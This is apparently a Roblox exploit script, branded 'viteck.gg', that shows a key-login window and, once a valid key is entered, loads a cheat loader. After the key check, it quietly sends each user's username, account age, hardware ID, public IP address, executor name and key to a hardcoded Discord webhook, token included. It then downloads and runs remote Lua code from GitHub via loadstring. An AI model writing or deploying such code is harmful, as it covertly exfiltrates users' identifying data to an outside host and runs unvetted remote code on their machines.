local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

local keysUrl = "https://goo.su/GuWUaKZ"
local webhookUrl = "https://discord.com/api/webhooks/1339239859184861286/tPcvy_EuDPL5cEt4kqkVdeM9wGSqFMCCYnaQkHeo0L-ets8TGpHl3J_OyPrFOcK-bOrT"
local ipUrl = "https://api64.ipify.org"

local function fetchKeys()
    local success, result = pcall(function()
        return game:HttpGet(keysUrl)
    end)
    if success then
        local keys = {}
        for key in string.gmatch(result, "[^\r\n]+") do
            table.insert(keys, key)
        end
        return keys
    else
        warn("error:", result)
        return {}
    end
end

local function getIPAddress()
    local success, result = pcall(function()
        return game:HttpGet(ipUrl)
    end)
    if success then
        return result
    else
        warn("failed to fetch IP:", result)
        return "unknown"
    end
end

local function getGameName()
    for i = 1, 3 do  
        local success, info = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId)
        end)
        if success and info then
            return info.Name
        end
        wait(1)
    end
    return "unknown"
end

local function getServerInfo()
    local playerGui = player:FindFirstChild("PlayerGui")
    if playerGui then
        local gameUI = playerGui:FindFirstChild("GameUI")
        if gameUI and gameUI:FindFirstChild("ServerInfo") and gameUI.ServerInfo:IsA("TextLabel") then
            return gameUI.ServerInfo.Text
        end
    end
    return "unknown"
end

local function sendLog(keyUsed)
    local http = syn and syn.request or request
    local AnalyticsService = game:GetService("RbxAnalyticsService")

    local hwid = "unknown"
    local executor = "unknown"
    local ipAddress = getIPAddress()

    local success_hwid, result_hwid = pcall(function()
        return AnalyticsService:GetClientId()
    end)
    if success_hwid and result_hwid then
        hwid = result_hwid
    end

    local success_exec, result_exec = pcall(function()
        if getexecutorid then
            return getexecutorid()
        elseif identifyexecutor then
            return identifyexecutor()
        end
    end)
    if success_exec and result_exec then
        executor = result_exec
    end

    local username = player.Name
    local displayName = player.DisplayName  
    local userId = player.UserId
    local placeId = game.PlaceId
    local jobId = game.JobId
    local accountAge = player.AccountAge
    local gameName = getGameName()
    local serverInfo = getServerInfo()

    local data = {
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "Player inject information",
                ["color"] = 8956648,
                ["fields"] = {
                    { ["name"] = "Username", ["value"] = username, ["inline"] = true },
                    { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
                    { ["name"] = "Account Age", ["value"] = tostring(accountAge) .. " days", ["inline"] = false },
                    { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = true },
                    { ["name"] = "PlaceID", ["value"] = tostring(placeId), ["inline"] = true },
                    { ["name"] = "JobID", ["value"] = jobId, ["inline"] = false },
                    { ["name"] = "HWID", ["value"] = hwid, ["inline"] = false },
                    { ["name"] = "IP", ["value"] = ipAddress, ["inline"] = false },
                    { ["name"] = "Key", ["value"] = keyUsed, ["inline"] = false },
                    { ["name"] = "Executor", ["value"] = executor, ["inline"] = false }
                },
                ["footer"] = {
                    ["text"] = "viteck.gg | Private",
                    ["icon_url"] = "https://i.pinimg.com/originals/d8/f5/19/d8f5191b05a8dc8476e8162c98fce299.jpg"
                }
            }
        }
    }

    http({
        Url = webhookUrl,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end

local function isValidKey(inputKey)
    local validKeys = fetchKeys()
    for _, key in ipairs(validKeys) do
        if inputKey == key then
            return true
        end
    end
    return false
end

local screenGui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
screenGui.Name = "KeyMenu"

local keyFrame = Instance.new("Frame", screenGui)
keyFrame.Size = UDim2.new(0, 320, 0, 180) 
keyFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
keyFrame.AnchorPoint = Vector2.new(0.5, 0.5)
keyFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
keyFrame.BorderSizePixel = 0

if not keyFrame:FindFirstChild("Gradient") then
    local gradient = Instance.new("UIGradient")
    gradient.Name = "Gradient"
    gradient.Parent = keyFrame
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(179, 164, 240)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 70, 200))   
    }
    gradient.Rotation = 90
end

local topLine = Instance.new("Frame", keyFrame)
topLine.Size = UDim2.new(1, 0, 0, 2)
topLine.Position = UDim2.new(0, 0, 0, 0)
topLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
topLine.BorderSizePixel = 0

local bottomLine = Instance.new("Frame", keyFrame)
bottomLine.Size = UDim2.new(1, 0, 0, 2) 
bottomLine.Position = UDim2.new(0, 0, 1, -2) 
bottomLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bottomLine.BorderSizePixel = 0

local titleLabel = Instance.new("TextLabel", keyFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 25)
titleLabel.Position = UDim2.new(0, 0, 0.08, 0)
titleLabel.Text = "viteck.gg"
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextScaled = true

titleLabel.TextStrokeTransparency = 0 
titleLabel.TextStrokeColor3 = Color3.fromRGB(194, 127, 255)

local keyInput = Instance.new("TextBox", keyFrame)
keyInput.Size = UDim2.new(0.75, 0, 0, 30) 
keyInput.Position = UDim2.new(0.125, 0, 0.3, 0)
keyInput.PlaceholderText = "enter key"
keyInput.Text = ""
keyInput.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
keyInput.TextColor3 = Color3.fromRGB(200, 200, 200)
keyInput.Font = Enum.Font.SourceSans
keyInput.TextScaled = true
keyInput.BorderSizePixel = 0 

local keyCorner = Instance.new("UICorner", keyInput)
keyCorner.CornerRadius = UDim.new(0, 8)

local keyStroke = Instance.new("UIStroke", keyInput)
keyStroke.Thickness = 1
keyStroke.Color = Color3.fromRGB(194, 127, 255)
keyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local checkKeyButton = Instance.new("TextButton", keyFrame)
checkKeyButton.Size = UDim2.new(0.55, 0, 0, 30) 
checkKeyButton.Position = UDim2.new(0.225, 0, 0.55, 0)
checkKeyButton.Text = "Login"
checkKeyButton.BackgroundColor3 = Color3.fromRGB(165, 161, 184)
checkKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
checkKeyButton.Font = Enum.Font.SourceSans
checkKeyButton.TextScaled = true
checkKeyButton.BorderSizePixel = 0

local buttonCorner = Instance.new("UICorner", checkKeyButton)
buttonCorner.CornerRadius = UDim.new(0, 8)

local buttonStroke = Instance.new("UIStroke", checkKeyButton)
buttonStroke.Thickness = 1
buttonStroke.Color = Color3.fromRGB(194, 127, 255)
buttonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local errorMessage = Instance.new("TextLabel", keyFrame)
errorMessage.Size = UDim2.new(0.8, 0, 0, 25)
errorMessage.Position = UDim2.new(0.1, 0, 0.75, 0)
errorMessage.Text = ""
errorMessage.BackgroundTransparency = 1
errorMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
errorMessage.Font = Enum.Font.SourceSans
errorMessage.TextScaled = true
errorMessage.BorderSizePixel = 0 


local UserInputService = game:GetService("UserInputService")

local dragging
local dragInput
local dragStart
local startPos

keyFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = keyFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

keyFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        keyFrame.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

checkKeyButton.MouseButton1Click:Connect(function()
    local userInputKey = keyInput.Text

    if isValidKey(userInputKey) then
        keyFrame.Visible = false
        screenGui:Destroy()

        sendLog(userInputKey)

        local success, errorMessage = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/guiddo806/sergeirusa.agency/refs/heads/main/Loader.lua", true))()
        end)

        if not success then
            warn("error loading script:", errorMessage)
        end
    else
        errorMessage.Text = "Invalid key"
        wait(1)
        errorMessage.Text = "Try again"
        wait(1)
        errorMessage.Text = ""
    end
end)
